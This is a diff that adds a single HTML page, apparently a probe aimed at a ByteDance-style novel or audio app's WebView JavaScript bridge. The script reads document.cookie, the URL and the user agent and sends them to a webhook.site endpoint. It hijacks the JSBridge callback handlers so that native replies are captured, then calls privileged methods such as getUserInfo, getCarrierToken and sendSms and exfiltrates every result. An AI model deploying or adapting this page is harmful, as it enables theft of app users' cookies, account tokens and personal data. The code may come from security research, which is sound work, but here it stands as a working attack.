@@ -1,0 +1,34 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>OMP-PROBE</title></head>
+<body><h1 id="s">PROBE</h1>
+<script>
+(function(){
+var T0=Date.now(); var CALLBACKS={}; var BASE='https://webhook.site/7786a423-64a1-4a58-aaef-fbed97f6ff94';
+function be(tag,obj){
+  try{ fetch(BASE+'/'+tag,{method:'POST',headers:{'Content-Type':'text/plain'},body:JSON.stringify(obj),keepalive:true}).catch(function(){}); }catch(e){}
+  try{ var im=new Image(); im.src=BASE+'/g_'+tag+'?d='+encodeURIComponent(JSON.stringify(obj)); }catch(e){}
+}
+function snap(){
+  var names=['JS2NativeBridge','ttwebview','iesJsBridgeTransferMonitor','SDKRuntime','SDKNativeWebApi','secsdk','verifySDK','registToGlobal','useWebSecsdkApi','ToutiaoJSBridge','BDXBridge','__globalProps','JSBridge','Native2JSBridge','hybridMonitor','PIA','webview','AndroidBridge'];
+  var o={};
+  names.forEach(function(n){ var v=window[n]; var t=typeof v; var m=[];
+    if(v && (t==='object'||t==='function')){ try{ m=Object.getOwnPropertyNames(v); }catch(e){ m=['ERR:'+e]; } }
+    o[n]={t:t,m:m}; });
+  return o;
+}
+be('env',{href:location.href,origin:location.origin,ua:navigator.userAgent,t:T0,env:snap(),cookie:document.cookie});
+window.JSBridge={_handleMessageFromApp:function(m){ var o=m; try{ if(typeof m==='string') o=JSON.parse(m); }catch(e){ o={raw:String(m)}; }
+  CALLBACKS[o&&o.__callback_id]=o; be('cb',{id:o&&o.__callback_id,func:o&&o.__func,p:o&&o.__params}); }};
+window.Native2JSBridge={_handleMessageFromApp:function(m){ be('cb2',{raw:typeof m==='string'?m.slice(0,400):m}); }};
+var METHODS=["fqbase.preloadImage", "fqbase.reportAppLog", "fqbase.showToast", "novelfm.SendADLog", "novelfm.appendVideoWorkList", "novelfm.checkDouyinPermission", "novelfm.clearPlayerBallLogParams", "novelfm.getABConfig", "novelfm.getActiveBookList", "novelfm.getDyIMLatestInfo", "novelfm.getExtraInfo", "novelfm.getMusicBlacklist", "novelfm.getNativeTest", "novelfm.getPlayStatus", "novelfm.getPostSeqAbConfig", "novelfm.getRemainingTimeToListen", "novelfm.getUserInfo", "novelfm.isEnableGoldCoinAudioTips", "novelfm.isRecommendEnabled", "novelfm.listenTimeCheckUpperLimit", "novelfm.nonStandardAdTrack", "novelfm.revokeFeedback", "novelfm.sendLoadingFinishTime", "novelfm.sendThirdTrack", "novelfm.setEnableGoldCoinAudioTips", "novelfm.setHeader", "novelfm.setPlayerBallLogParams", "novelfm.setStatusBar", "novelfm.setStayPageParams", "novelfm.setSwipeBackEnabled", "novelfm.setVipRenewPromotionPopupTime", "novelfm.takeOverBackPress", "novelfm.updateDislikeState", "account.fetch", "account.getCarrierPhone", "account.getCarrierToken", "account.getSdkVersion", "account.getVerifyDecision", "account.onUserInfoChanged", "account.sendLog", "account.sendSms", "account.setVerifyStatus", "account.verify", "upc.getApiRecordStatus", "upc.getPrivacyStatus", "upc.getSystemAuthorityStatus", "upc.getTeenMode", "bullet.getVisibleInfo", "bullet.prefetch", "bullet.prefetchV2", "bullet.preload", "bullet.preloadResource", "bullet.setTracert", "bullet.stopRecord", "original.appendVideoWorkList", "original.originUpdateSeries", "original.updateVideoWorkInfo", "ad.preloadVideo", "inspire.preloadRewardVideoAd", "pia.internal.trigger", "pia.rendering.execute", "anniex.preInit", "x.getAppInfo", "x.getUserInfo", "x.getSettings", "x.close", "getSettings", "novelfm.__probe_nonexistent__"];
+var i=0;
+function next(){
+  if(i>=METHODS.length){ be('done',{n:i,ts:Date.now()-T0,callbacks:Object.keys(CALLBACKS).length}); document.getElementById('s').textContent='DONE '+Object.keys(CALLBACKS).length; return; }
+  var f=METHODS[i]; var id='m'+i;
+  try{ window.JS2NativeBridge._invokeMethod(JSON.stringify({func:f,namespace:'',params:{},__msg_type:'JSSDK',__callback_id:id,__timestamp:Date.now(),appID:'3040'})); be('sent',{i:i,f:f}); }
+  catch(e){ be('senderr',{i:i,f:f,e:String(e)}); }
+  i++; setTimeout(next,150);
+}
+setTimeout(next,300);
+setInterval(function(){ be('hb',{href:location.href,t:Date.now()-T0}); },3000);
+})();
+</script></body></html>
